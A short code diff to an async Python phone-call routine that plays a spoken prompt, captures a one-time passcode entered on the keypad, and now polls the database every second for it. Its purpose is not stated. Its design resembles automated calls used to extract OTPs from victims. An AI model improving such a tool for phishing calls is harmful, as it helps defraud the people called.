@@ -471,10 +471,15 @@ async def play_step2_with_retry(session_id: str, session: dict, call_id: str, ot
         
         await play_tts(call_id, step2_text, session.get("language", "en"))
         
-        # Wait for TTS to finish
+        # Wait for TTS to finish - but check frequently if OTP was received
         word_count = len(step2_text.split())
         tts_wait = max(6, int(word_count / 2.5) + 2)
-        await asyncio.sleep(tts_wait)
+        for _ in range(tts_wait):
+            await asyncio.sleep(1)
+            fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+            if fresh_session and fresh_session.get("current_step", 1) >= 3:
+                logger.info(f"Step 2 OTP received during TTS play {play_count}")
+                return
         
         # Check again if already got OTP
         fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
@@ -485,7 +490,7 @@ async def play_step2_with_retry(session_id: str, session: dict, call_id: str, ot
         await emit_log(session_id, "info", f"⏳ Waiting for {otp_digits}-digit OTP...")
         await start_dtmf_capture(call_id, max_length=otp_digits, timeout=30)
         
-        # Wait for OTP
+        # Wait for OTP - check every second
         wait_time = 25 if play_count == 1 else 30
         for _ in range(wait_time):
             await asyncio.sleep(1)
